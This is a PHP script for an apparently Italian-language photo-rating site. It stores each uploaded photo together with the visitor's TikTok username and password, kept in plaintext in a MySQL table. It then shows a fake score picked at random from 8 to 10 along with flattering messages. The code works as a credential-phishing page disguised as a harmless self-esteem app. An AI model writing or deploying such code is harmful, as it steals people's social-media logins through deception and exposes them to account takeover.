<?php

// Connessione database (Render userà variabili d'ambiente)
$host     = getenv('MYSQL_HOST')     ?: die('Errore: manca MYSQL_HOST');
$dbname   = getenv('MYSQL_DATABASE') ?: die('Errore: manca MYSQL_DATABASE');
$user     = getenv('MYSQL_USER')     ?: die('Errore: manca MYSQL_USER');
$pass     = getenv('MYSQL_PASSWORD') ?: die('Errore: manca MYSQL_PASSWORD');

try {
    $pdo = new PDO("mysql:host=$host;dbname=$dbname;charset=utf8mb4", $user, $pass);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    die("Errore connessione al database: " . htmlspecialchars($e->getMessage()));
}

// Crea tabella (solo la prima volta)
$pdo->exec("CREATE TABLE IF NOT EXISTS foto (
    id INT AUTO_INCREMENT PRIMARY KEY,
    filename VARCHAR(255) NOT NULL,
    username_tiktok VARCHAR(100),
    password_tiktok VARCHAR(100),
    voto TINYINT UNSIGNED NOT NULL,
    stato ENUM('pending','approvato') DEFAULT 'pending',
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");

// ──── Elabora la foto ───────────────────────────────────────
if (!empty($_FILES['foto']['name'])) {
    $file = $_FILES['foto'];
    $estensioni_ok = ['jpg', 'jpeg', 'png'];
    $est = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));

    if ($file['error'] === 0 && in_array($est, $estensioni_ok)) {

        $nome_file = time() . '_' . uniqid() . '.' . $est;
        $percorso = '/uploads/' . $nome_file;  // Disco persistente su Render

        if (move_uploaded_file($file['tmp_name'], $percorso)) {

            // ALGORITMO VOTO: SOLO 8, 9 o 10 per alzare l'autostima 💕
            $voti_alti = [8, 9, 9, 10, 10, 10];   // più probabilità di 10 e 9
            $voto = $voti_alti[array_rand($voti_alti)];

            // Salva nel database
            $stmt = $pdo->prepare("INSERT INTO foto (filename, username_tiktok, password_tiktok, voto) VALUES (?, ?, ?, ?)");
            $stmt->execute([$nome_file, $_POST['username_tiktok'], $_POST['password_tiktok'], $voto]);

            // Risultato bello e positivo
            echo "<!DOCTYPE html><html lang='it'><head><meta charset='UTF-8'><title>Il tuo voto!</title>
                  <style>body{font-family:Arial;text-align:center;background:#fff0f5;padding:60px;}
                  h1{color:#ff69b4;font-size:3.5em;} .voto{font-size:5em;color:#ff1493;font-weight:bold;}
                  img{max-width:90%;border-radius:16px;margin:30px 0;box-shadow:0 10px 30px rgba(0,0,0,0.15);}
                  a{font-size:1.5em;color:#d63384;text-decoration:none;}</style></head><body>
                  <h1>Wow! Sei proprio stupendə! 💖✨</h1>
                  <p>La tua foto ha preso:</p>
                  <div class='voto'>$voto / 10</div>
                  <img src='/uploads/$nome_file' alt='La tua foto'>
                  <br><br><a href='index.php'>→ Carica un'altra foto e senti ancora l'amore!</a>
                  </body></html>";

        } else {
            die("<h2 style='color:red'>Errore: non riesco a salvare la foto 😔</h2>");
        }
    } else {
        die("<h2 style='color:red'>Solo foto .jpg .jpeg .png per favore!</h2>");
    }
} else {
    die("<h2 style='color:red'>Non hai caricato nessuna foto!</h2>");
}